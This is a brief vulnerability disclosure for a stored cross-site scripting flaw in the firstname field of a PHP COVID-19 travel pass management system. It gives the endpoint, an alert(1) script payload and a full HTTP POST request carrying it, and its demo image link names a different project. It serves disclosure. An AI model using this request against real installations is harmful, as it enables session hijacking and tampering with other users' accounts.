# covid-19-travel-pass-management-system v1.0 - Cross-site Scripting (XSS)

vendors: https://www.sourcecodester.com/php/15308/covid-19-travel-pass-management-system-phpoop-free-source-code.html

Date: 2022-05-07

Vulnerability File: /ctpms/classes/Users.php?f=save

Vulnerability location: /ctpms/classes/Users.php?f=save, firstname

[+] Payload: <sCrIpT>alert(1)</sCrIpT>

Tested on Windows 10, XAMPP

```
POST /ctpms/classes/Users.php?f=save HTTP/1.1
Host: 192.168.2.106
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------3611536016190209454970609370
Content-Length: 1036
Origin: http://192.168.2.106
Connection: keep-alive
Referer: http://192.168.2.106/ctpms/admin/?page=user/manage_user&id=7
Cookie: PHPSESSID=0389fublnj7ggho8q04fuvfaqe

-----------------------------3611536016190209454970609370
Content-Disposition: form-data; name="id"

7
-----------------------------3611536016190209454970609370
Content-Disposition: form-data; name="firstname"

<ScRiPt>alert(1)</ScRiPt>
-----------------------------3611536016190209454970609370
Content-Disposition: form-data; name="middlename"

dgfd
-----------------------------3611536016190209454970609370
Content-Disposition: form-data; name="lastname"

gfdf
-----------------------------3611536016190209454970609370
Content-Disposition: form-data; name="username"

gdf
-----------------------------3611536016190209454970609370
Content-Disposition: form-data; name="password"


-----------------------------3611536016190209454970609370
Content-Disposition: form-data; name="type"

1
-----------------------------3611536016190209454970609370
Content-Disposition: form-data; name="img"; filename=""
Content-Type: application/octet-stream


-----------------------------3611536016190209454970609370--

```

![](https://github.com/mikeccltt/badminton-center-management-system/blob/main/xss.gif?raw=true)